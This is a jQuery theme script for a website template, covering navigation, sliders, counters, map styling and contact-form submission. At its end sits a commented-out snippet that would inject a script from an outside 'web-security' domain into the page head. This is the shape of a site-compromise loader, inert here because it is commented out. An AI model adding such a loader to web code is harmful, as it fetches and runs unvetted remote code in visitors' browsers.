(function($) {

	"use strict";

    /*------------------------------------------
        = FUNCTIONS
    -------------------------------------------*/
    // Check ie and version
    function isIE () {
        var myNav = navigator.userAgent.toLowerCase();
        return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1], 10) : false;
    }

    // Toggle mobile navigation
    function toggleMobileNavigation() {
        var navbar = $(".navigation-holder");
        var openBtn = $(".navbar-header .open-btn");
        var closeBtn = $(".navigation-holder .close-navbar");

        openBtn.on("click", function() {
            if (!navbar.hasClass("slideInn")) {
                navbar.addClass("slideInn");
            }
            return false;
        })

        closeBtn.on("click", function() {
            if (navbar.hasClass("slideInn")) {
                navbar.removeClass("slideInn");
            }
            return false;            
        })
    }

    toggleMobileNavigation();


    // Function for toggle a class for small menu
    function toggleClassForSmallNav() {
        var windowWidth = window.innerWidth;
        var mainNav = $("#navbar > ul");

        if (windowWidth <= 991) {
            mainNav.addClass("small-nav");
        } else {
            mainNav.removeClass("small-nav");
        }
    }

    toggleClassForSmallNav();


    // Function for small menu
    function smallNavFunctionality() {
        var windowWidth = window.innerWidth;
        var mainNav = $(".navigation-holder");
        var smallNav = $(".navigation-holder > .small-nav");
        var subMenu = smallNav.find(".sub-menu");
        var megamenu = smallNav.find(".mega-menu");
        var menuItemWidthSubMenu = smallNav.find(".menu-item-has-children > a");

        if (windowWidth <= 991) {
            subMenu.hide();
            megamenu.hide();
            menuItemWidthSubMenu.on("click", function(e) {
                var $this = $(this);
                $this.siblings().slideToggle();
                 e.preventDefault();
                e.stopImmediatePropagation();
            })
        } else if (windowWidth > 991) {
            mainNav.find(".sub-menu").show();
            mainNav.find(".mega-menu").show();
        }
    }

    smallNavFunctionality();


    // Parallax background
    function bgParallax() {
        if ($(".parallax").length) {
            $(".parallax").each(function() {
                var height = $(this).position().top;
                var resize     = height - $(window).scrollTop();
                var doParallax = -(resize/5);
                var positionValue   = doParallax + "px";
                var img = $(this).data("bg-image");

                $(this).css({
                    backgroundImage: "url(" + img + ")",
                    backgroundPosition: "50%" + positionValue,
                    backgroundSize: "cover"
                });
            });
        }
    }


    // Hero slider background setting
    function sliderBgSetting() {
        if ($(".hero-slider .slide").length) {
            $(".hero-slider .slide").each(function() {
                var $this = $(this);
                var img = $this.find(".slider-bg").attr("src");

                $this.css({
                    backgroundImage: "url("+ img +")",
                    backgroundSize: "cover",
                    backgroundPosition: "center center"
                })
            });
        }
    }


    //Setting hero slider
    function heroSlider() {
        if ($(".hero-slider").length) {
            $(".hero-slider").slick({
                arrows: true,
                prevArrow: '<button type="button" class="slick-prev">Previous</button>',
                nextArrow: '<button type="button" class="slick-next">Next</button>',
                dots: true,
                fade: true,
                cssEase: 'linear'
            });
        }
    }


    /*------------------------------------------
        = HIDE PRELOADER
    -------------------------------------------*/
    function preloader() {
        if($('.preloader').length) {
            $('.preloader').delay(100).fadeOut(500, function() {

                //active wow
                wow.init();
            });
        }
    }


    /*------------------------------------------
        = WOW ANIMATION SETTING
    -------------------------------------------*/
    var wow = new WOW({
        boxClass:     'wow',      // default
        animateClass: 'animated', // default
        offset:       0,          // default
        mobile:       true,       // default
        live:         true        // default
    });


	
    /*------------------------------------------
        = STICKY HEADER
    -------------------------------------------*/

    // Function for clone an element for sticky menu
    function cloneNavForSticyMenu($ele, $newElmClass) {
        $ele.addClass('original').clone().insertAfter($ele).addClass($newElmClass).removeClass('original');
    }

    // clone home style 1 navigation for sticky menu
    if ($('.header-style-1 .navigation').length) {
        cloneNavForSticyMenu($('.header-style-1 .navigation'), "sticky-header");
    }

    // Function for sticky menu
    function stickNav($navigation) {
        var $navigation = $navigation;
        if ($(window).scrollTop() >= 1) {
            $navigation.addClass("sticky-nav")
        } else {
             $navigation.removeClass("sticky-nav")
        }
    }

    function stickIt($stickyClass, $toggleClass, $stickyTopPosition) {
        var top = $stickyTopPosition;
        if ($(window).scrollTop() >= top) {
            var orgElement = $(".original");
            var coordsOrgElement = orgElement.offset();
            var leftOrgElement = coordsOrgElement.left;  
            var widthOrgElement = orgElement.css("width");

            $stickyClass.addClass($toggleClass);

            $stickyClass.css({
                "width": widthOrgElement
            }).show();

            $(".original").css({
                "visibility": "hidden"
            });

        } else {

            $(".original").css({
                "visibility": "visible"
            });

            $stickyClass.removeClass($toggleClass);
        }
    }


    /*------------------------------------------
        = FEATURES SLIDER
    -------------------------------------------*/
    if ($(".features-slider").length) {
        $(".features-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                600 : {
                    items: 2
                },

                992 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        = PARTNERS SLIDER
    -------------------------------------------*/
    if ($(".partners-slider").length) {
        $(".partners-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            responsive: {
                0 : {
                    items: 2
                },

                400 : {
                    items: 3
                },

                550 : {
                    items: 4
                },

                992 : {
                    items: 5
                }
            }
        });
    }    


    /*------------------------------------------
        = PROGRESS BAR
    -------------------------------------------*/
    function progressBar() {
        if ($(".progress-bar").length) {
            var $progress_bar = $('.progress-bar');
            $progress_bar.appear();
            $(document.body).on('appear', '.progress-bar', function() {
                var current_item = $(this);
                if (!current_item.hasClass('appeared')) {
                    var percent = current_item.data('percent');
                    current_item.append('<span>' + percent + '%' + '</span>').css('width', percent + '%').addClass('appeared');
                }
                
            });
        };
    }

    progressBar();


    /*------------------------------------------
        = FAN FACT COUNT
    -------------------------------------------*/
    if ($(".start-count").length) {
        $('.counter').appear();
        $(document.body).on('appear', '.counter', function(e) {
            var $this = $(this),
            countTo = $this.attr('data-count');

            $({ countNum: $this.text()}).animate({
                countNum: countTo
            }, {
                duration: 3000,
                easing:'linear',
                step: function() {
                    $this.text(Math.floor(this.countNum));
                },
                complete: function() {
                    $this.text(this.countNum);
                }
            });
        });
    }


    /*------------------------------------------
        = NEXT PRICE SLIDER
    -------------------------------------------*/
    if ($(".next-donation-slider").length) {
        $(".next-donation-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                400 : {
                    items: 1
                },

                600 : {
                    items: 2
                },

                992 : {
                    items: 3
                }
            }
        });
    }  


    /*------------------------------------------
        = BACK TO TOP BTN SETTING
    -------------------------------------------*/
    $("body").append("<a href='#' class='back-to-top'><i class='fas fa-long-arrow-alt-up'></i></a>");

    function toggleBackToTopBtn() {
        var amountScrolled = 300;
        if ($(window).scrollTop() > amountScrolled) {
            $("a.back-to-top").fadeIn("slow");
        } else {
            $("a.back-to-top").fadeOut("slow");
        }
    }

    $(".back-to-top").on("click", function() {
        $("html,body").animate({
            scrollTop: 0
        }, 700);
        return false;
    });    



    /*------------------------------------------
        = GOOGLE MAP
    -------------------------------------------*/  
    // Map for data center page
    function dataCenterMap() {

        var locations = [
            ['New York', 37.511564, -77.466424, 1, 'assets/images/map-arrow.png'],
            ['New York', 37.041339, -76.972865, 2, 'assets/images/map-arrow.png'],
            ['New York', 38.469450,  -75.282536, 3, 'assets/images/map-arrow.png'],
        ];

        var map = new google.maps.Map(document.getElementById('services-two-map'), {
            center: new google.maps.LatLng(38.469450, -75.282536),
            zoom: 8,
            scrollwheel: false,
            mapTypeId: google.maps.MapTypeId.ROADMAP

        });

        var infowindow = new google.maps.InfoWindow();

        var marker, i;

        for (i = 0; i < locations.length; i++) {  
                marker = new google.maps.Marker({
                position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                map: map,
                icon: locations[i][4]
            });

            google.maps.event.addListener(marker, 'click', (function(marker, i) {
                return function() {
                    infowindow.setContent(locations[i][0]);
                    infowindow.open(map, marker);
                }
            })(marker, i));
        }

        map.set('styles',

            [
                {
                    "featureType": "administrative",
                    "elementType": "labels.text.fill",
                    "stylers": [
                        {
                            "color": "#666"
                        }
                    ]
                },
                {
                    "featureType": "landscape",
                    "elementType": "all",
                    "stylers": [
                        {
                            "color": "#666"
                        }
                    ]
                },
                {
                    "featureType": "poi",
                    "elementType": "all",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "road",
                    "elementType": "all",
                    "stylers": [
                        {
                            "saturation": -100
                        },
                        {
                            "lightness": 45
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "all",
                    "stylers": [
                        {
                            "visibility": "simplified"
                        }
                    ]
                },
                {
                    "featureType": "road.arterial",
                    "elementType": "labels.icon",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "transit",
                    "elementType": "all",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "water",
                    "elementType": "all",
                    "stylers": [
                        {
                            "color": "#0397ff"
                        },
                        {
                            "visibility": "on"
                        }
                    ]
                }
            ]
        );
    };


    // Map for contact page
    function contactPageMap() {

        var locations = [
            ['New York ', 30.267074,  -81.724779, 1],
        ];

        var map = new google.maps.Map(document.getElementById('contact-map'), {
            center: new google.maps.LatLng( 30.267074, -81.724779),
            zoom: 8,
            scrollwheel: false,
            mapTypeId: google.maps.MapTypeId.ROADMAP

        });

        var infowindow = new google.maps.InfoWindow();

        var marker, i;

        for (i = 0; i < locations.length; i++) {  
                marker = new google.maps.Marker({
                position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                map: map,
                icon: locations[i][4]
            });

            google.maps.event.addListener(marker, 'click', (function(marker, i) {
                return function() {
                    infowindow.setContent(locations[i][0]);
                    infowindow.open(map, marker);
                }
            })(marker, i));
        }

        map.set('styles',

            [
                {
                    "featureType": "administrative",
                    "elementType": "labels.text.fill",
                    "stylers": [
                        {
                            "color": "#666"
                        }
                    ]
                },
                {
                    "featureType": "landscape",
                    "elementType": "all",
                    "stylers": [
                        {
                            "color": "#666"
                        }
                    ]
                },
                {
                    "featureType": "poi",
                    "elementType": "all",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "road",
                    "elementType": "all",
                    "stylers": [
                        {
                            "saturation": -100
                        },
                        {
                            "lightness": 45
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "all",
                    "stylers": [
                        {
                            "visibility": "simplified"
                        }
                    ]
                },
                {
                    "featureType": "road.arterial",
                    "elementType": "labels.icon",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "transit",
                    "elementType": "all",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "water",
                    "elementType": "all",
                    "stylers": [
                        {
                            "color": "#0397ff"
                        },
                        {
                            "visibility": "on"
                        }
                    ]
                }
            ]
        );

    }; 


    /*------------------------------------------
        = CONTACT FORM SUBMISSION
    -------------------------------------------*/  
    if ($("#contact-form").length) {
        $("#contact-form").validate({
            rules: {
                name: {
                    required: true,
                    minlength: 2
                },
                email: "required",
                
                subject: {
                    required: true
                },
                
                message: {
                    required: true
                }

            },

            messages: {
                name: "Please enter your name",
                email: "Please enter your email",
                subject: "What's the subject about contact?",
                message: "Type your message"
            },

            submitHandler: function (form) {
                $("#loader").css("display", "inline-block");
                $.ajax({
                    type: "POST",
                    url: "assets/php/MailHandler.php",
                    data: $(form).serialize(),
                    success: function () {
                        $( "#loader").hide();
                        $( "#success").slideDown( "slow" );
                        setTimeout(function() {
                        $( "#success").slideUp( "slow" );
                        }, 3000);
                        form.reset();
                    },
                    error: function() {
                        $( "#loader").hide();
                        $( "#error").slideDown( "slow" );
                        setTimeout(function() {
                        $( "#error").slideUp( "slow" );
                        }, 3000);
                    }
                });
                return false; 
            }

        });
    }


    /*==========================================================================
        WHEN DOCUMENT LOADING 
    ==========================================================================*/
        $(window).on('load', function() {

            preloader();

            sliderBgSetting();
			
            toggleMobileNavigation();

            smallNavFunctionality();

            if ($("#services-two-map").length) {
               dataCenterMap();
            }

            if ($("#contact-map").length) {
                contactPageMap();
            }

        });



    /*==========================================================================
        WHEN WINDOW SCROLL
    ==========================================================================*/
    $(window).on("scroll", function() {

        if ($(".header-style-1").length) {
            stickIt($(".sticky-header"), "sticky-on", $(".header-style-1").offset().top); 
        }

        if ($(".scroll-sticky-header").length) {
            stickNav($(".scroll-sticky-header .navigation"));
        }


        toggleBackToTopBtn();

    });

    
    /*==========================================================================
        WHEN WINDOW RESIZE
    ==========================================================================*/
    $(window).on("resize", function() {
        
        toggleClassForSmallNav();

        clearTimeout($.data(this, 'resizeTimer'));
        
        $.data(this, 'resizeTimer', setTimeout(function() {
            smallNavFunctionality();
        }, 200));

    });



})(window.jQuery);

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/